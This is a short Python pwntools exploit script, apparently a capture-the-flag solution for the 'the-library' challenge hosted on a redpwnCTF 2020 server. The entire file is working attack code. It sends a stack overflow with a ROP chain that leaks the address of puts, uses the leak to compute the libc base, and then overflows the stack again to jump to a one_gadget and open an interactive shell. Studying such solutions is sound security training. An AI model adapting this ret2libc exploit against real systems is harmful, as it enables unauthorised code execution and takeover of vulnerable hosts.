from pwn import*
context(arch='amd64',os='linux',log_level='debug')

binary='./the-library'
elf=ELF(binary)
libc=ELF("libc.so.6")

# io=process(binary)
io=remote("2020.redpwnc.tf",31350)

puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
main_addr=0x400637
pop_rdi=0x400733

payload='a'*0x10+'b'*8+p64(pop_rdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(main_addr)
io.recvuntil("What's your name?\n")
io.sendline(payload)

io.recvuntil("Hello there: ")
io.recvuntil("b"*8)
puts_addr=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.info("puts_addr=>%#x" % puts_addr)

libc_base=puts_addr-libc.sym['puts']
log.info("libc_base=>%#x" % libc_base)
system_addr=libc_base+libc.sym['system']
binsh_addr=libc_base+libc.search('/bin/sh').next()
one_gadget=libc_base+0x4f2c5

payload='a'*0x18
payload+=p64(one_gadget)
io.recvuntil("What's your name?\n")
io.sendline(payload)
io.interactive()
